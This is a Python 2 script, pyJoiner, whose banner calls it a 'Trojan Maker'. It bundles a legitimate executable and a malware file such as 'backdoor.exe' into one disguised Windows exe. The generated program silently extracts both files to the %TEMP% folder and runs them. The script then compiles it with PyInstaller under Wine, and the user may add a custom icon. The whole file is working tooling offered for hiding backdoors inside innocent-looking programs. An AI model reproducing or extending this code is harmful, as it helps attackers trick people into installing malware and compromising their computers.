#
# pyJoiner - Kali Linux Version (i386)
# Open Source Exe Joiner
# C0d3r: Daniel Henrique Negri Moreno (a.k.a W1ckerMan)
#
# pyJoiner is used for join files, similar SFX, but the major difference is that
# pyJoiner silenty extracts joined files in %TEMP% directory and execute them.
#
# After process, /root/pyJoiner_output/py_file.exe will be generated.
# The output py_file.exe must be execute under Windows platform.
#
#
# Usage: python pyJoiner.py

import os, base64, random, string, urllib

def install_Python_PyInstaller():

    python_url = 'https://www.python.org/ftp/python/2.7.12/python-2.7.12.msi'
    python_tmp = '/tmp/python-2.7.12.msi'
    python_directory = '/root/.wine/drive_c/Python27'
    python_exe = "%s/python.exe" %python_directory
    pyInstaller = '%s/Scripts/pyinstaller.exe' %python_directory
    pip_exe = "%s/Scripts/pip.exe" %python_directory

    if not os.path.exists(python_directory):
        print 'Python 2.7.12 was not installed in', python_directory
        print 'Making download and installation of Python 2.7.12'
        print 'Wait :)'
        urllib.urlretrieve(python_url, python_tmp)
        os.system('wine msiexec /i %s' %python_tmp)
        os.remove(python_tmp)
        print

    if not os.path.exists(pyInstaller):
        print 'PyInstaller was not installed in %s' %pyInstaller
        print 'Making download and installation of PyInstaller'
        print 'Wait :)'
        os.system('wine %s %s install pyinstaller' %(python_exe,pip_exe))

    #Check if everything is OK
    if not os.path.exists(python_exe) or not os.path.exists(pyInstaller):
        if not os.path.exists(python_exe):
            print "\nERROR -> Python not installed in %s" %python_exe
        if not os.path.exists(pyInstaller):
            print "\nERROR -> Pyinstaller not installed in %s" %pyInstaller
        exit()
    else:
        print 'Everything is OK! \n'

def banner():
    print('''
##########################################################################
#                                                                        #
#            pyJoiner - Open Source Exe Joiner (Trojan Maker)            #
#                                                                        #
#                                                                        #
#                                                                        #
# Coder: Daniel Henrique Negri Moreno (a.k.a W1ckerMan)                  #
#                                                                        #
#                                                                        #
# What is pyJoiner?                                                      #
#                                                                        #
# pyJoiner is used for join files, like self-extracting archive (SFX).   #
# The major difference resides in fact that pyJoiner extracts files      #
# in %TEMP% Windows directory and executes them.                         #
#                                                                        #
#                                                                        #
# Why use pyJoiner?                                                      #
#                                                                        #
# To create Torjan Horse.                                                #
# Supose you have two files. First, a legitm software ("game.exe") and   #
# second, a malware ("backdoor.exe").                                    #
# pyJoiner join first and second file in only one file: "py_file.exe".   #
# "py_file.exe", when executed, extracts and execute, first ("game.exe") #
# and second ("backdoor.exe") files.                                     #
#                                                                        #
#                                                                        #
# How to use pyJoiner?                                                   #
#                                                                        #
# e.g: "game.exe" is your first file. Type "game.exe" when pyJoiner ask  #
# you "1st file: "                                                       #
# "backdoor.exe" is your second file. Type "backdoor.exe" when pyJoiner  #
# ask you "2nd file: "                                                   #
#                                                                        #
#                                                                        #
# After all, "/root/pyJoiner_output/py_file.exe" will be generated.      #
#                                                                        #
#                                                                        #
##########################################################################
''')

class FileExtensionError(Exception):
    def __str__(self):
        return 'File is not ".ico"'

class file:
    def __init__(self,name):
        self.name = name
        self.random_name = "".join(random.choice(string.ascii_letters+string.digits) for x in range(15))
        self.extension = os.path.splitext(self.name)[1]

    def create_py_file(file1,file2):
        with open(file1.name, 'rb') as file_n1:
            with open(file2.name, 'rb') as file_n2:
                if not os.path.exists('/root/pyJoiner_output'):
                    os.mkdir('/root/pyJoiner_output')
                with open('/root/pyJoiner_output/py_file.pyw', 'w') as py_file:
                    py_file.write('''import os, base64

def join(file,file_name, file_extension):
    if not os.path.exists(os.environ["TEMP"]+os.sep+file_name+file_extension):
        with open(os.environ["TEMP"]+os.sep+file_name+file_extension,"wb") as output_file:
            output_file.write(base64.b64decode(file))
    os.startfile(os.environ["TEMP"]+os.sep+file_name+file_extension)

file1 = "%s"
file2 = "%s"


join(file1, "%s", "%s")
join(file2, "%s", "%s") ''' %( base64.b64encode(file_n1.read()), base64.b64encode(file_n2.read()),
                               file1.random_name, file1.extension,
                               file2.random_name, file2.extension))

    @staticmethod
    def compile_with_PyInstaller():
        while True:
            wanna_icon = raw_input('Icon? (y)es, (n)o: ').lower()
            if wanna_icon == 'y' or wanna_icon == 'yes':
                icon = raw_input('Icon: ')
                if not os.path.exists(icon):
                    raise FileNotFoundError('Icon "%s" not found' %icon)
                if os.path.splitext(icon)[1] != '.ico':
                    raise FileExtensionError

                print 'Please wait until PyInstaller compile files...'
                os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe'
                          ' --distpath /root/pyJoiner_output'
                          ' --workpath /root/pyJoiner_output'
                          ' --specpath /root/pyJoiner_output'
                          ' --icon %s --windowed --onefile /root/pyJoiner_output/py_file.pyw' %icon)
                break

            elif wanna_icon == 'n' or wanna_icon == 'no':
                print 'Please wait until PyInstaller compile files...'
                os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe'
                          ' --distpath /root/pyJoiner_output'
                          ' --workpath /root/pyJoiner_output'
                          ' --specpath /root/pyJoiner_output'
                          ' --windowed --onefile /root/pyJoiner_output/py_file.pyw')
                break

            else:
                print 'Only (y)es or (n)o'

        print '\nDone! Files are in /root/pyJoiner_output'


install_Python_PyInstaller()
banner()

file1 = file(raw_input('1st file: '))
file2 = file(raw_input('2nd file: '))

file.create_py_file(file1,file2)
file.compile_with_PyInstaller()
